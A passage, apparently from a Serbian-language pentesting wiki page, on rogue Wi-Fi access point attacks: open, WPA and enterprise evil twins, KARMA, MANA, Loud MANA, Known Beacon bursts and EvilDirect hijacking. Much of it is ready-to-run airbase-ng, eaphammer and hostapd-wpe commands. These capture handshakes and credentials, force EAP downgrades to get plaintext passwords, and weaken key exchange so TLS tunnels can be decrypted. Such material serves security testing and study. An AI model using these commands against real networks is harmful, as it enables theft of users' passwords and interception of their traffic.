- **Client Roaming and Connection Manipulation**: Protokol 802.11 omogućava uređajima da se kreću između access points unutar istog ESS. Napadači to mogu iskoristiti tako što će namamiti uređaj da se odspoji sa svoje trenutne base station i poveže na rogue. Ovo se može postići ponudom jačeg signala ili ometanjem veze sa legitimnim access point kroz metode kao što su deauthentication packets ili jamming.
- **Izazovi u izvođenju**: Uspešno izvođenje evil twin attack u okruženjima sa više, dobro postavljenih access points može biti zahtevno. Deauthenticating jednog legitimnog access point-a često rezultira time da se uređaj poveže na drugi legitiman access point, osim ako napadač ne može deauthenticate sve obližnje access points ili strateški postaviti rogue access point.

Možete kreirati vrlo osnovni Open Evil Twin (bez mogućnosti da routujete saobraćaj na Internet) radeći:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Takođe možete kreirati Evil Twin koristeći **eaphammer** (imajte na umu da, da biste kreirali evil twins sa **eaphammer**, interface **NE bi trebao biti** u **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ili koristeći Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Imajte na umu da podrazumevano, ako je ESSID u PNL sačuvan kao WPA protected, uređaj se neće automatski povezati na Open evil Twin. Možete pokušati DoS-ovati pravi AP i nadati se da će se korisnik ručno povezati na vaš Open evil twin, ili možete DoS-ovati pravi AP i koristiti WPA Evil Twin da uhvatite handshake (koristeći ovu metodu nećete moći da omogućite žrtvi da se poveže na vas jer ne znate PSK, ali možete uhvatiti handshake i pokušati ga crack-ovati).

_Neki OS i AV će upozoriti korisnika da je povezivanje na Open mrežu opasno..._

### WPA/WPA2 Evil Twin

Možete napraviti **Evil Twin using WPA/2** i ako su uređaji konfigurisani da se povezuju na taj SSID koristeći WPA/2, pokušaće da se povežu. U svakom slučaju, **to complete the 4-way-handshake** takođe morate **know** **the password** koju će klijent koristiti. Ako **don't know** taj password, **the connection won't be completed**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Da biste razumeli ovaj napad, preporučujem da pre toga pročitate kratak [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Korišćenje hostapd-wpe**

`hostapd-wpe` zahteva **konfiguracioni** fajl za rad. Za **automatizaciju** generisanja ovih konfiguracija možete koristiti [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (preuzmite python fajl u _/etc/hostapd-wpe_/)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
U konfiguracionom fajlu možete izabrati mnogo različitih stvari kao što su ssid, channel, user files, cret/key, dh parameters, wpa version i auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Korišćenje EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Podrazumevano, EAPHammer koristi sledeće metode autentifikacije (imajte na umu GTC kao prvu koja se isprobava da bi se dobile plaintext passwords, a potom se koriste robusnije auth metode):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Ovo je podrazumevana metodologija da biste izbegli dugačko vreme povezivanja. Međutim, možete i specificirati serveru metode autentikacije od najslabijih do najjačih:
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` da koristite visoko efikasnu GTC downgrade implementaciju (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` da ručno specificirate ponuđene metode (nudeći iste auth metode u istom redosledu kao organizacija, napad će biti mnogo teže otkriti).
- [Pronađite više informacija u wiki-ju](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Korišćenje Airgeddon**

`Airgeddon` može koristiti prethodno generisane certifikate da ponudi EAP autentifikaciju za WPA/WPA2-Enterprise mreže. Lažna mreža će sniziti protokol konekcije na EAP-MD5 tako da će moći da **uhvati korisnika i MD5 lozinke**. Kasnije, napadač može pokušati da razbije lozinku.\
`Airggedon` vam nudi mogućnost **kontinuirane Evil Twin attack (noisy)** ili **samo kreirati Evil Attack dok se neko ne poveže (smooth).**

![](<../../images/image (936).png>)

### Otklanjanje grešaka PEAP i EAP-TTLS TLS tunela u Evil Twins napadima

_Ova metoda je testirana na PEAP konekciji ali pošto dekriptujem proizvoljan TLS tunel, ovo bi trebalo da radi i sa EAP-TTLS_

Unutar **konfiguracije** _hostapd-wpe_ **zakomentarišite** liniju koja sadrži _**dh_file**_ (od `dh_file=/etc/hostapd-wpe/certs/dh` do `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Ovo će naterati `hostapd-wpe` da **razmenjuje ključeve koristeći RSA** umesto DH, pa ćete moći kasnije da **dešifrujete** saobraćaj **znajući privatni ključ servera**.

Sada pokrenite **Evil Twin** koristeći **`hostapd-wpe`** sa tom izmenjenom konfiguracijom kao i obično. Takođe, pokrenite **`wireshark`** na **interfejsu** koji izvodi Evil Twin attack.

Sada ili kasnije (kada ste već uhvatili neke pokušaje autentifikacije) možete dodati privatni RSA ključ u wireshark na: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Dodajte novi unos i popunite formular sa sledećim vrednostima: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**izaberite vaš key file**, da biste izbegli probleme izaberite key file **koji nije zaštićen lozinkom**).

![](<../../images/image (687).png>)

I pogledajte novu **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons napad

### ESSID i MAC black/whitelists

Različite vrste Media Access Control Filter Lists (MFACLs) i njihovi odgovarajući režimi i efekti na ponašanje lažnog Access Point-a (AP):

1. **MAC-based Whitelist**:
- Rogue AP će odgovarati samo na probe zahteve sa uređaja navedenih u whitelisti, ostajući nevidljiv za sve ostale koji nisu na listi.
2. **MAC-based Blacklist**:
- Rogue AP će ignorisati probe zahteve sa uređaja na blacklisti, efektivno čineći rogue AP nevidljivim za te specifične uređaje.
3. **SSID-based Whitelist**:
- Rogue AP će odgovarati na probe zahteve samo za specifične ESSID-ove koji su na listi, čineći ga nevidljivim za uređaje čije Preferred Network Lists (PNLs) ne sadrže te ESSID-ove.
4. **SSID-based Blacklist**:
- Rogue AP neće odgovarati na probe zahteve za specifične ESSID-ove koji su na blacklisti, čineći ga nevidljivim za uređaje koja traže baš te mreže.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Ovaj metod omogućava napadaču da kreira maliciozni access point (AP) koji odgovara na sve probe requests sa uređaja koji pokušavaju da se povežu na mreže. Ova tehnika navodi uređaje da se povežu na napadačev AP imitirajući mreže koje uređaji traže. Kada uređaj pošalje zahtev za konekciju tom rogue AP, konekcija se uspostavlja i uređaj greškom ostane povezan na mrežu napadača.

### MANA

Zatim, **uređaji su počeli da ignorišu nepouzdane odgovore mreže**, smanjujući efikasnost originalnog karma napada. Međutim, novi metod, poznat kao **MANA attack**, predstavili su Ian de Villiers i Dominic White. Ovaj metod podrazumeva da rogue AP **hvata Preferred Network Lists (PNL) sa uređaja odgovarajući na njihove broadcast probe requests** imenima mreža (SSIDs) koje su uređaji ranije memorisali. Ovaj sofisticirani napad zaobilazi zaštite protiv originalnog karma attack iskorišćavanjem načina na koji uređaji pamte i prioritizuju poznate mreže.

The MANA attack radi posmatranjem kako directed, tako i broadcast probe requests sa uređaja. Za directed requests, beleži MAC address uređaja i traženo ime mreže, dodajući te informacije na listu. Kada stigne broadcast request, AP odgovara informacijama koje se poklapaju sa bilo kojom od mreža na listi uređaja, nagoneći uređaj da se poveže na rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

**Loud MANA attack** je napredna strategija za situacije kada uređaji ne koriste directed probing ili kada su njihove Preferred Network Lists (PNL) nepoznate napadaču. Radi po principu da **uređaji u istoj oblasti verovatno dele neke nazive mreža u svojim PNLs**. Umesto selektivnog odgovaranja, ovaj attack emituje probe responses za svaki naziv mreže (ESSID) pronađen u kombinovanim PNLs svih posmatranih uređaja. Ovakav širok pristup povećava šansu da uređaj prepozna poznatu mrežu i pokuša da se poveže na rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Kada **Loud MANA attack** možda nije dovoljan, **Known Beacon attack** nudi alternativu. Ova metoda **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs** dobijenih iz wordlist. To simulira prisustvo brojnih mreža, nadajući se da će se poklopiti ESSID u PNL žrtve, što će izazvati pokušaj povezivanja na izmišljeni AP. Napad se može pojačati kombinovanjem sa opcijom `--loud` za agresivniji pokušaj da se namame uređaji.

Eaphammer je implementirao ovaj napad kao MANA attack gde su svi ESSIDs iz liste emitovani (takođe možete kombinovati ovo sa `--loud` da kreirate Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

**Known Beacon Burst attack** uključuje **brzo rafalno emitovanje beacon frames za svaki ESSID naveden u fajlu**. Ovo stvara gusto okruženje lažnih mreža, značajno povećavajući verovatnoću da se uređaji povežu na rogue AP, posebno kada se kombinuje sa MANA attack. Ova tehnika koristi brzinu i obim da preoptereti mehanizme uređaja za izbor mreže.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** je protokol koji omogućava uređajima da se direktno povežu jedni sa drugima koristeći Wi‑Fi, bez potrebe za tradicionalnom bežičnom access point-om. Ova funkcionalnost je integrisana u raznim Internet of Things (IoT) uređajima, kao što su štampači i televizori, i olakšava direktnu komunikaciju uređaj‑uredjaj. Značajna karakteristika Wi‑Fi Direct je da jedan uređaj preuzima ulogu pristupne tačke, poznat kao group owner, za upravljanje konekcijom.

Bezbednost Wi‑Fi Direct konekcija uspostavlja se putem **Wi‑Fi Protected Setup (WPS)**, koje podržava nekoliko metoda za sigurno uparivanje, uključujući:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Ove metode, naročito PIN entry, podložne su istim ranjivostima kao WPS u tradicionalnim Wi‑Fi mrežama, što ih čini metama za slične attack vectors.

### EvilDirect Hijacking

**EvilDirect Hijacking** je napad specifičan za Wi‑Fi Direct. Odražava koncept Evil Twin napada ali cilja Wi‑Fi Direct veze. U ovom scenariju, napadač se predstavlja kao legitimni group owner sa ciljem da prevari uređaje da se povežu na zlonamerni entitet. Ova metoda se može izvesti korišćenjem alata kao što je `airbase-ng` tako što će se specificirati kanal, ESSID i MAC adresa uređaja koji se imitira:

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: Pogledajte [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login con facebook e imitacionde WPA en captive portals)

{{#include ../../banners/hacktricks-training.md}}
